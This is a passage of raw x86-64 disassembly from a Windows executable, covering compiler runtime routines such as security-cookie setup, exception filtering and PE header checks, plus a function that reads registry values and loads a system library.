   14000170a:	48 6b c0 02          	imul   $0x2,%rax,%rax
   14000170e:	48 8d 0d fb cb 00 00 	lea    0xcbfb(%rip),%rcx        # 0x14000e310
   140001715:	48 8b 15 a4 c9 00 00 	mov    0xc9a4(%rip),%rdx        # 0x14000e0c0
   14000171c:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   140001720:	b8 08 00 00 00       	mov    $0x8,%eax
   140001725:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140001729:	48 8b 0d 50 c9 00 00 	mov    0xc950(%rip),%rcx        # 0x14000e080
   140001730:	48 89 4c 04 68       	mov    %rcx,0x68(%rsp,%rax,1)
   140001735:	b8 08 00 00 00       	mov    $0x8,%eax
   14000173a:	48 6b c0 01          	imul   $0x1,%rax,%rax
   14000173e:	48 8b 0d 7b c9 00 00 	mov    0xc97b(%rip),%rcx        # 0x14000e0c0
   140001745:	48 89 4c 04 68       	mov    %rcx,0x68(%rsp,%rax,1)
   14000174a:	48 8d 0d af 98 00 00 	lea    0x98af(%rip),%rcx        # 0x14000b000
   140001751:	e8 22 fe ff ff       	call   0x140001578
   140001756:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   14000175d:	c3                   	ret
   14000175e:	cc                   	int3
   14000175f:	cc                   	int3
   140001760:	cc                   	int3
   140001761:	cc                   	int3
   140001762:	cc                   	int3
   140001763:	cc                   	int3
   140001764:	48 83 ec 78          	sub    $0x78,%rsp
   140001768:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   14000176f:	00 00 
   140001771:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140001778:	00 00 
   14000177a:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140001781:	00 00 
   140001783:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   14000178a:	00 00 
   14000178c:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140001793:	00 00 
   140001795:	48 8d 0d f4 cb 00 00 	lea    0xcbf4(%rip),%rcx        # 0x14000e390
   14000179c:	ff 15 8e 9d 00 00    	call   *0x9d8e(%rip)        # 0x14000b530
   1400017a2:	48 8b 05 df cc 00 00 	mov    0xccdf(%rip),%rax        # 0x14000e488
   1400017a9:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400017ae:	45 33 c0             	xor    %r8d,%r8d
   1400017b1:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400017b6:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400017bb:	ff 15 67 9d 00 00    	call   *0x9d67(%rip)        # 0x14000b528
   1400017c1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400017c6:	48 83 7c 24 40 00    	cmpq   $0x0,0x40(%rsp)
   1400017cc:	74 42                	je     0x140001810
   1400017ce:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400017d5:	00 00 
   1400017d7:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400017dc:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400017e1:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400017e6:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400017eb:	48 8d 05 9e cb 00 00 	lea    0xcb9e(%rip),%rax        # 0x14000e390
   1400017f2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400017f7:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   1400017fc:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   140001801:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   140001806:	33 c9                	xor    %ecx,%ecx
   140001808:	ff 15 12 9d 00 00    	call   *0x9d12(%rip)        # 0x14000b520
   14000180e:	eb 23                	jmp    0x140001833
   140001810:	48 8b 05 11 cc 00 00 	mov    0xcc11(%rip),%rax        # 0x14000e428
   140001817:	48 8b 00             	mov    (%rax),%rax
   14000181a:	48 89 05 67 cc 00 00 	mov    %rax,0xcc67(%rip)        # 0x14000e488
   140001821:	48 8b 05 00 cc 00 00 	mov    0xcc00(%rip),%rax        # 0x14000e428
   140001828:	48 83 c0 08          	add    $0x8,%rax
   14000182c:	48 89 05 f5 cb 00 00 	mov    %rax,0xcbf5(%rip)        # 0x14000e428
   140001833:	48 8b 05 4e cc 00 00 	mov    0xcc4e(%rip),%rax        # 0x14000e488
   14000183a:	48 89 05 bf ca 00 00 	mov    %rax,0xcabf(%rip)        # 0x14000e300
   140001841:	c7 05 a5 ca 00 00 09 	movl   $0xc0000409,0xcaa5(%rip)        # 0x14000e2f0
   140001848:	04 00 c0 
   14000184b:	c7 05 9f ca 00 00 01 	movl   $0x1,0xca9f(%rip)        # 0x14000e2f4
   140001852:	00 00 00 
   140001855:	c7 05 a9 ca 00 00 01 	movl   $0x1,0xcaa9(%rip)        # 0x14000e308
   14000185c:	00 00 00 
   14000185f:	b8 08 00 00 00       	mov    $0x8,%eax
   140001864:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140001868:	48 8d 0d a1 ca 00 00 	lea    0xcaa1(%rip),%rcx        # 0x14000e310
   14000186f:	48 c7 04 01 08 00 00 	movq   $0x8,(%rcx,%rax,1)
   140001876:	00 
   140001877:	48 8d 0d 82 97 00 00 	lea    0x9782(%rip),%rcx        # 0x14000b000
   14000187e:	e8 f5 fc ff ff       	call   0x140001578
   140001883:	48 83 c4 78          	add    $0x78,%rsp
   140001887:	c3                   	ret
   140001888:	cc                   	int3
   140001889:	cc                   	int3
   14000188a:	cc                   	int3
   14000188b:	cc                   	int3
   14000188c:	cc                   	int3
   14000188d:	cc                   	int3
   14000188e:	cc                   	int3
   14000188f:	cc                   	int3
   140001890:	48 83 ec 28          	sub    $0x28,%rsp
   140001894:	48 8b 01             	mov    (%rcx),%rax
   140001897:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000189d:	75 23                	jne    0x1400018c2
   14000189f:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   1400018a3:	75 1d                	jne    0x1400018c2
   1400018a5:	8b 48 20             	mov    0x20(%rax),%ecx
   1400018a8:	8d 81 e0 fa 6c e6    	lea    -0x19930520(%rcx),%eax
   1400018ae:	83 f8 02             	cmp    $0x2,%eax
   1400018b1:	76 08                	jbe    0x1400018bb
   1400018b3:	81 f9 00 40 99 01    	cmp    $0x1994000,%ecx
   1400018b9:	75 07                	jne    0x1400018c2
   1400018bb:	ff 15 ef 9d 00 00    	call   *0x9def(%rip)        # 0x14000b6b0
   1400018c1:	cc                   	int3
   1400018c2:	33 c0                	xor    %eax,%eax
   1400018c4:	48 83 c4 28          	add    $0x28,%rsp
   1400018c8:	c3                   	ret
   1400018c9:	cc                   	int3
   1400018ca:	cc                   	int3
   1400018cb:	cc                   	int3
   1400018cc:	cc                   	int3
   1400018cd:	cc                   	int3
   1400018ce:	cc                   	int3
   1400018cf:	cc                   	int3
   1400018d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400018d4:	48 8d 0d b5 ff ff ff 	lea    -0x4b(%rip),%rcx        # 0x140001890
   1400018db:	ff 15 2f 9c 00 00    	call   *0x9c2f(%rip)        # 0x14000b510
   1400018e1:	33 c0                	xor    %eax,%eax
   1400018e3:	48 83 c4 28          	add    $0x28,%rsp
   1400018e7:	c3                   	ret
   1400018e8:	cc                   	int3
   1400018e9:	cc                   	int3
   1400018ea:	cc                   	int3
   1400018eb:	cc                   	int3
   1400018ec:	cc                   	int3
   1400018ed:	cc                   	int3
   1400018ee:	ff 25 24 9e 00 00    	jmp    *0x9e24(%rip)        # 0x14000b718
   1400018f4:	cc                   	int3
   1400018f5:	cc                   	int3
   1400018f6:	cc                   	int3
   1400018f7:	cc                   	int3
   1400018f8:	cc                   	int3
   1400018f9:	cc                   	int3
   1400018fa:	cc                   	int3
   1400018fb:	cc                   	int3
   1400018fc:	48 83 ec 18          	sub    $0x18,%rsp
   140001900:	33 d2                	xor    %edx,%edx
   140001902:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140001906:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   14000190a:	77 3c                	ja     0x140001948
   14000190c:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140001911:	66 39 01             	cmp    %ax,(%rcx)
   140001914:	75 2a                	jne    0x140001940
   140001916:	39 51 3c             	cmp    %edx,0x3c(%rcx)
   140001919:	7c 25                	jl     0x140001940
   14000191b:	81 79 3c 00 00 00 10 	cmpl   $0x10000000,0x3c(%rcx)
   140001922:	73 1c                	jae    0x140001940
   140001924:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140001928:	48 03 c1             	add    %rcx,%rax
   14000192b:	48 89 04 24          	mov    %rax,(%rsp)
   14000192f:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001935:	48 0f 45 c2          	cmovne %rdx,%rax
   140001939:	48 8b d0             	mov    %rax,%rdx
   14000193c:	48 89 04 24          	mov    %rax,(%rsp)
   140001940:	eb 06                	jmp    0x140001948
   140001942:	33 d2                	xor    %edx,%edx
   140001944:	48 89 14 24          	mov    %rdx,(%rsp)
   140001948:	48 8b c2             	mov    %rdx,%rax
   14000194b:	48 83 c4 18          	add    $0x18,%rsp
   14000194f:	c3                   	ret
   140001950:	cc                   	int3
   140001951:	cc                   	int3
   140001952:	cc                   	int3
   140001953:	cc                   	int3
   140001954:	cc                   	int3
   140001955:	cc                   	int3
   140001956:	cc                   	int3
   140001957:	cc                   	int3
   140001958:	40 53                	rex push %rbx
   14000195a:	48 83 ec 20          	sub    $0x20,%rsp
   14000195e:	8b d9                	mov    %ecx,%ebx
   140001960:	33 c9                	xor    %ecx,%ecx
   140001962:	ff 15 10 9b 00 00    	call   *0x9b10(%rip)        # 0x14000b478
   140001968:	48 85 c0             	test   %rax,%rax
   14000196b:	74 29                	je     0x140001996
   14000196d:	48 8b c8             	mov    %rax,%rcx
   140001970:	e8 87 ff ff ff       	call   0x1400018fc
   140001975:	48 85 c0             	test   %rax,%rax
   140001978:	74 1c                	je     0x140001996
   14000197a:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000197f:	66 39 48 5c          	cmp    %cx,0x5c(%rax)
   140001983:	75 04                	jne    0x140001989
   140001985:	8b c1                	mov    %ecx,%eax
   140001987:	eb 0f                	jmp    0x140001998
   140001989:	66 83 78 5c 03       	cmpw   $0x3,0x5c(%rax)
   14000198e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001993:	0f 44 d9             	cmove  %ecx,%ebx
   140001996:	8b c3                	mov    %ebx,%eax
   140001998:	48 83 c4 20          	add    $0x20,%rsp
   14000199c:	5b                   	pop    %rbx
   14000199d:	c3                   	ret
   14000199e:	cc                   	int3
   14000199f:	cc                   	int3
   1400019a0:	cc                   	int3
   1400019a1:	cc                   	int3
   1400019a2:	cc                   	int3
   1400019a3:	cc                   	int3
   1400019a4:	ff 25 66 9d 00 00    	jmp    *0x9d66(%rip)        # 0x14000b710
   1400019aa:	cc                   	int3
   1400019ab:	cc                   	int3
   1400019ac:	cc                   	int3
   1400019ad:	cc                   	int3
   1400019ae:	cc                   	int3
   1400019af:	cc                   	int3
   1400019b0:	33 c0                	xor    %eax,%eax
   1400019b2:	c3                   	ret
   1400019b3:	cc                   	int3
   1400019b4:	cc                   	int3
   1400019b5:	cc                   	int3
   1400019b6:	cc                   	int3
   1400019b7:	cc                   	int3
   1400019b8:	cc                   	int3
   1400019b9:	cc                   	int3
   1400019ba:	cc                   	int3
   1400019bb:	cc                   	int3
   1400019bc:	cc                   	int3
   1400019bd:	cc                   	int3
   1400019be:	cc                   	int3
   1400019bf:	cc                   	int3
   1400019c0:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   1400019c4:	45 33 c9             	xor    %r9d,%r9d
   1400019c7:	4c 03 c1             	add    %rcx,%r8
   1400019ca:	4c 8b d2             	mov    %rdx,%r10
   1400019cd:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   1400019d2:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   1400019d7:	48 83 c0 18          	add    $0x18,%rax
   1400019db:	49 03 c0             	add    %r8,%rax
   1400019de:	45 85 db             	test   %r11d,%r11d
   1400019e1:	74 1e                	je     0x140001a01
   1400019e3:	8b 50 0c             	mov    0xc(%rax),%edx
   1400019e6:	4c 3b d2             	cmp    %rdx,%r10
   1400019e9:	72 0a                	jb     0x1400019f5
   1400019eb:	8b 48 08             	mov    0x8(%rax),%ecx
   1400019ee:	03 ca                	add    %edx,%ecx
   1400019f0:	4c 3b d1             	cmp    %rcx,%r10
   1400019f3:	72 0e                	jb     0x140001a03
   1400019f5:	41 ff c1             	inc    %r9d
   1400019f8:	48 83 c0 28          	add    $0x28,%rax
   1400019fc:	45 3b cb             	cmp    %r11d,%r9d
   1400019ff:	72 e2                	jb     0x1400019e3
   140001a01:	33 c0                	xor    %eax,%eax
   140001a03:	c3                   	ret
   140001a04:	cc                   	int3
   140001a05:	cc                   	int3
   140001a06:	cc                   	int3
   140001a07:	cc                   	int3
   140001a08:	cc                   	int3
   140001a09:	cc                   	int3
   140001a0a:	cc                   	int3
   140001a0b:	cc                   	int3
   140001a0c:	cc                   	int3
   140001a0d:	cc                   	int3
   140001a0e:	cc                   	int3
   140001a0f:	cc                   	int3
   140001a10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001a15:	57                   	push   %rdi
   140001a16:	48 83 ec 20          	sub    $0x20,%rsp
   140001a1a:	48 8b d9             	mov    %rcx,%rbx
   140001a1d:	48 8d 3d dc e5 ff ff 	lea    -0x1a24(%rip),%rdi        # 0x140000000
   140001a24:	48 8b cf             	mov    %rdi,%rcx
   140001a27:	e8 44 00 00 00       	call   0x140001a70
   140001a2c:	85 c0                	test   %eax,%eax
   140001a2e:	74 22                	je     0x140001a52
   140001a30:	48 2b df             	sub    %rdi,%rbx
   140001a33:	48 8b d3             	mov    %rbx,%rdx
   140001a36:	48 8b cf             	mov    %rdi,%rcx
   140001a39:	e8 82 ff ff ff       	call   0x1400019c0
   140001a3e:	48 85 c0             	test   %rax,%rax
   140001a41:	74 0f                	je     0x140001a52
   140001a43:	8b 40 24             	mov    0x24(%rax),%eax
   140001a46:	c1 e8 1f             	shr    $0x1f,%eax
   140001a49:	f7 d0                	not    %eax
   140001a4b:	83 e0 01             	and    $0x1,%eax
   140001a4e:	eb 02                	jmp    0x140001a52
   140001a50:	33 c0                	xor    %eax,%eax
   140001a52:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001a57:	48 83 c4 20          	add    $0x20,%rsp
   140001a5b:	5f                   	pop    %rdi
   140001a5c:	c3                   	ret
   140001a5d:	cc                   	int3
   140001a5e:	cc                   	int3
   140001a5f:	cc                   	int3
   140001a60:	cc                   	int3
   140001a61:	cc                   	int3
   140001a62:	cc                   	int3
   140001a63:	cc                   	int3
   140001a64:	cc                   	int3
   140001a65:	cc                   	int3
   140001a66:	cc                   	int3
   140001a67:	cc                   	int3
   140001a68:	cc                   	int3
   140001a69:	cc                   	int3
   140001a6a:	cc                   	int3
   140001a6b:	cc                   	int3
   140001a6c:	cc                   	int3
   140001a6d:	cc                   	int3
   140001a6e:	cc                   	int3
   140001a6f:	cc                   	int3
   140001a70:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140001a75:	66 39 01             	cmp    %ax,(%rcx)
   140001a78:	75 1e                	jne    0x140001a98
   140001a7a:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140001a7e:	48 03 d1             	add    %rcx,%rdx
   140001a81:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   140001a87:	75 0f                	jne    0x140001a98
   140001a89:	33 c0                	xor    %eax,%eax
   140001a8b:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   140001a90:	66 39 4a 18          	cmp    %cx,0x18(%rdx)
   140001a94:	0f 94 c0             	sete   %al
   140001a97:	c3                   	ret
   140001a98:	33 c0                	xor    %eax,%eax
   140001a9a:	c3                   	ret
   140001a9b:	cc                   	int3
   140001a9c:	cc                   	int3
   140001a9d:	cc                   	int3
   140001a9e:	cc                   	int3
   140001a9f:	cc                   	int3
   140001aa0:	cc                   	int3
   140001aa1:	cc                   	int3
   140001aa2:	cc                   	int3
   140001aa3:	cc                   	int3
   140001aa4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001aa9:	55                   	push   %rbp
   140001aaa:	48 8b ec             	mov    %rsp,%rbp
   140001aad:	48 83 ec 20          	sub    $0x20,%rsp
   140001ab1:	48 83 65 20 00       	andq   $0x0,0x20(%rbp)
   140001ab6:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140001abd:	2b 00 00 
   140001ac0:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   140001ac5:	48 8b 05 b4 c5 00 00 	mov    0xc5b4(%rip),%rax        # 0x14000e080
   140001acc:	48 3b c3             	cmp    %rbx,%rax
   140001acf:	0f 85 93 00 00 00    	jne    0x140001b68
   140001ad5:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140001ad9:	ff 15 09 9a 00 00    	call   *0x9a09(%rip)        # 0x14000b4e8
   140001adf:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001ae3:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140001ae7:	ff 15 0b 9a 00 00    	call   *0x9a0b(%rip)        # 0x14000b4f8
   140001aed:	8b c0                	mov    %eax,%eax
   140001aef:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140001af3:	ff 15 f7 99 00 00    	call   *0x99f7(%rip)        # 0x14000b4f0
   140001af9:	8b c0                	mov    %eax,%eax
   140001afb:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140001aff:	ff 15 db 99 00 00    	call   *0x99db(%rip)        # 0x14000b4e0
   140001b05:	8b c0                	mov    %eax,%eax
   140001b07:	48 c1 e0 18          	shl    $0x18,%rax
   140001b0b:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140001b0f:	ff 15 cb 99 00 00    	call   *0x99cb(%rip)        # 0x14000b4e0
   140001b15:	8b c0                	mov    %eax,%eax
   140001b17:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140001b1b:	48 33 45 10          	xor    0x10(%rbp),%rax
   140001b1f:	48 33 c1             	xor    %rcx,%rax
   140001b22:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140001b26:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140001b2a:	ff 15 d0 99 00 00    	call   *0x99d0(%rip)        # 0x14000b500
   140001b30:	8b 45 18             	mov    0x18(%rbp),%eax
   140001b33:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140001b3a:	ff 00 00 
   140001b3d:	48 c1 e0 20          	shl    $0x20,%rax
   140001b41:	48 33 45 18          	xor    0x18(%rbp),%rax
   140001b45:	48 33 45 10          	xor    0x10(%rbp),%rax
   140001b49:	48 23 c1             	and    %rcx,%rax
   140001b4c:	48 8b c8             	mov    %rax,%rcx
   140001b4f:	48 3b c3             	cmp    %rbx,%rax
   140001b52:	75 0d                	jne    0x140001b61
   140001b54:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
   140001b5b:	2b 00 00 
   140001b5e:	48 8b c8             	mov    %rax,%rcx
   140001b61:	48 89 0d 18 c5 00 00 	mov    %rcx,0xc518(%rip)        # 0x14000e080
   140001b68:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140001b6d:	48 f7 d0             	not    %rax
   140001b70:	48 89 05 49 c5 00 00 	mov    %rax,0xc549(%rip)        # 0x14000e0c0
   140001b77:	48 83 c4 20          	add    $0x20,%rsp
   140001b7b:	5d                   	pop    %rbp
   140001b7c:	c3                   	ret
   140001b7d:	cc                   	int3
   140001b7e:	cc                   	int3
   140001b7f:	cc                   	int3
   140001b80:	cc                   	int3
   140001b81:	cc                   	int3
   140001b82:	cc                   	int3
   140001b83:	ff 25 47 9b 00 00    	jmp    *0x9b47(%rip)        # 0x14000b6d0
   140001b89:	cc                   	int3
   140001b8a:	cc                   	int3
   140001b8b:	cc                   	int3
   140001b8c:	cc                   	int3
   140001b8d:	cc                   	int3
   140001b8e:	cc                   	int3
   140001b8f:	ff 25 33 9b 00 00    	jmp    *0x9b33(%rip)        # 0x14000b6c8
   140001b95:	cc                   	int3
   140001b96:	cc                   	int3
   140001b97:	cc                   	int3
   140001b98:	cc                   	int3
   140001b99:	cc                   	int3
   140001b9a:	cc                   	int3
   140001b9b:	cc                   	int3
   140001b9c:	cc                   	int3
   140001b9d:	cc                   	int3
   140001b9e:	cc                   	int3
   140001b9f:	cc                   	int3
   140001ba0:	cc                   	int3
   140001ba1:	cc                   	int3
   140001ba2:	cc                   	int3
   140001ba3:	cc                   	int3
   140001ba4:	cc                   	int3
   140001ba5:	cc                   	int3
   140001ba6:	ff 25 14 9b 00 00    	jmp    *0x9b14(%rip)        # 0x14000b6c0
   140001bac:	cc                   	int3
   140001bad:	cc                   	int3
   140001bae:	cc                   	int3
   140001baf:	cc                   	int3
   140001bb0:	cc                   	int3
   140001bb1:	cc                   	int3
   140001bb2:	cc                   	int3
   140001bb3:	cc                   	int3
   140001bb4:	cc                   	int3
   140001bb5:	cc                   	int3
   140001bb6:	cc                   	int3
   140001bb7:	cc                   	int3
   140001bb8:	cc                   	int3
   140001bb9:	cc                   	int3
   140001bba:	cc                   	int3
   140001bbb:	cc                   	int3
   140001bbc:	cc                   	int3
   140001bbd:	cc                   	int3
   140001bbe:	cc                   	int3
   140001bbf:	cc                   	int3
   140001bc0:	c2 00 00             	ret    $0x0
   140001bc3:	cc                   	int3
   140001bc4:	cc                   	int3
   140001bc5:	cc                   	int3
   140001bc6:	cc                   	int3
   140001bc7:	cc                   	int3
   140001bc8:	cc                   	int3
   140001bc9:	cc                   	int3
   140001bca:	cc                   	int3
   140001bcb:	cc                   	int3
   140001bcc:	cc                   	int3
   140001bcd:	cc                   	int3
   140001bce:	cc                   	int3
   140001bcf:	cc                   	int3
   140001bd0:	cc                   	int3
   140001bd1:	cc                   	int3
   140001bd2:	cc                   	int3
   140001bd3:	cc                   	int3
   140001bd4:	cc                   	int3
   140001bd5:	cc                   	int3
   140001bd6:	cc                   	int3
   140001bd7:	cc                   	int3
   140001bd8:	48 8b c4             	mov    %rsp,%rax
   140001bdb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001bdf:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140001be3:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140001be7:	4c 89 68 20          	mov    %r13,0x20(%rax)
   140001beb:	55                   	push   %rbp
   140001bec:	41 56                	push   %r14
   140001bee:	41 57                	push   %r15
   140001bf0:	48 8d a8 58 fe ff ff 	lea    -0x1a8(%rax),%rbp
   140001bf7:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   140001bfe:	48 8b 05 7b c4 00 00 	mov    0xc47b(%rip),%rax        # 0x14000e080
   140001c05:	48 33 c4             	xor    %rsp,%rax
   140001c08:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   140001c0f:	45 33 ff             	xor    %r15d,%r15d
   140001c12:	48 8d 4c 24 61       	lea    0x61(%rsp),%rcx
   140001c17:	bb 03 01 00 00       	mov    $0x103,%ebx
   140001c1c:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   140001c21:	44 8b c3             	mov    %ebx,%r8d
   140001c24:	44 89 7c 24 58       	mov    %r15d,0x58(%rsp)
   140001c29:	33 d2                	xor    %edx,%edx
   140001c2b:	44 88 7c 24 60       	mov    %r15b,0x60(%rsp)
   140001c30:	e8 71 ff ff ff       	call   0x140001ba6
   140001c35:	44 8b c3             	mov    %ebx,%r8d
   140001c38:	44 88 7d 70          	mov    %r15b,0x70(%rbp)
   140001c3c:	33 d2                	xor    %edx,%edx
   140001c3e:	48 8d 4d 71          	lea    0x71(%rbp),%rcx
   140001c42:	e8 5f ff ff ff       	call   0x140001ba6
   140001c47:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140001c4c:	44 89 7c 24 5c       	mov    %r15d,0x5c(%rsp)
   140001c51:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001c56:	48 8d 15 db c4 00 00 	lea    0xc4db(%rip),%rdx        # 0x14000e138
   140001c5d:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140001c62:	45 33 c9             	xor    %r9d,%r9d
   140001c65:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001c6a:	45 33 c0             	xor    %r8d,%r8d
   140001c6d:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140001c72:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140001c79:	c7 44 24 28 1f 00 02 	movl   $0x2001f,0x28(%rsp)
   140001c80:	00 
   140001c81:	41 8b f7             	mov    %r15d,%esi
   140001c84:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140001c89:	48 ff 15 a0 95 00 00 	rex.W call *0x95a0(%rip)        # 0x14000b230
   140001c90:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001c95:	85 c0                	test   %eax,%eax
   140001c97:	0f 85 55 02 00 00    	jne    0x140001ef2
   140001c9d:	41 8b df             	mov    %r15d,%ebx
   140001ca0:	bf c8 00 00 00       	mov    $0xc8,%edi
   140001ca5:	44 8b cb             	mov    %ebx,%r9d
   140001ca8:	4c 8d 05 c1 c4 00 00 	lea    0xc4c1(%rip),%r8        # 0x14000e170
   140001caf:	ba 50 00 00 00       	mov    $0x50,%edx
   140001cb4:	48 8d 0d b5 cb 00 00 	lea    0xcbb5(%rip),%rcx        # 0x14000e870
   140001cbb:	e8 88 1b 00 00       	call   0x140003848
   140001cc0:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001cc5:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
   140001cca:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001ccf:	48 8d 15 9a cb 00 00 	lea    0xcb9a(%rip),%rdx        # 0x14000e870
   140001cd6:	45 33 c9             	xor    %r9d,%r9d
   140001cd9:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140001cde:	45 33 c0             	xor    %r8d,%r8d
   140001ce1:	48 ff 15 60 95 00 00 	rex.W call *0x9560(%rip)        # 0x14000b248
   140001ce8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ced:	85 c0                	test   %eax,%eax
   140001cef:	75 25                	jne    0x140001d16
   140001cf1:	ff c3                	inc    %ebx
   140001cf3:	3b df                	cmp    %edi,%ebx
   140001cf5:	7c ae                	jl     0x140001ca5
   140001cf7:	75 1d                	jne    0x140001d16
   140001cf9:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001cfe:	48 ff 15 53 95 00 00 	rex.W call *0x9553(%rip)        # 0x14000b258
   140001d05:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001d0a:	44 88 3d 5f cb 00 00 	mov    %r15b,0xcb5f(%rip)        # 0x14000e870
   140001d11:	e9 dc 01 00 00       	jmp    0x140001ef2
   140001d16:	41 be 04 01 00 00    	mov    $0x104,%r14d
   140001d1c:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001d20:	41 8b d6             	mov    %r14d,%edx
   140001d23:	48 ff 15 ce 95 00 00 	rex.W call *0x95ce(%rip)        # 0x14000b2f8
   140001d2a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001d2f:	4c 8d 05 a2 9b 00 00 	lea    0x9ba2(%rip),%r8        # 0x14000b8d8
   140001d36:	41 8b d6             	mov    %r14d,%edx
   140001d39:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001d3d:	e8 9a 78 00 00       	call   0x1400095dc
   140001d42:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001d46:	48 ff 15 b3 95 00 00 	rex.W call *0x95b3(%rip)        # 0x14000b300
   140001d4d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001d52:	48 8b f8             	mov    %rax,%rdi
   140001d55:	48 85 c0             	test   %rax,%rax
   140001d58:	0f 84 d2 00 00 00    	je     0x140001e30
   140001d5e:	48 8d 15 83 9b 00 00 	lea    0x9b83(%rip),%rdx        # 0x14000b8e8
   140001d65:	48 8b c8             	mov    %rax,%rcx
   140001d68:	48 ff 15 d9 95 00 00 	rex.W call *0x95d9(%rip)        # 0x14000b348
   140001d6f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001d74:	48 8b cf             	mov    %rdi,%rcx
   140001d77:	48 8b d8             	mov    %rax,%rbx
   140001d7a:	48 ff 15 e7 95 00 00 	rex.W call *0x95e7(%rip)        # 0x14000b368
   140001d81:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001d86:	48 85 db             	test   %rbx,%rbx
   140001d89:	40 0f 95 c6          	setne  %sil
   140001d8d:	48 85 db             	test   %rbx,%rbx
   140001d90:	0f 84 9a 00 00 00    	je     0x140001e30
   140001d96:	41 8b d6             	mov    %r14d,%edx
   140001d99:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001d9e:	48 ff 15 53 95 00 00 	rex.W call *0x9553(%rip)        # 0x14000b2f8
   140001da5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001daa:	85 c0                	test   %eax,%eax
   140001dac:	74 14                	je     0x140001dc2
   140001dae:	4c 8d 05 7b 9a 00 00 	lea    0x9a7b(%rip),%r8        # 0x14000b830
   140001db5:	41 8b d6             	mov    %r14d,%edx
   140001db8:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
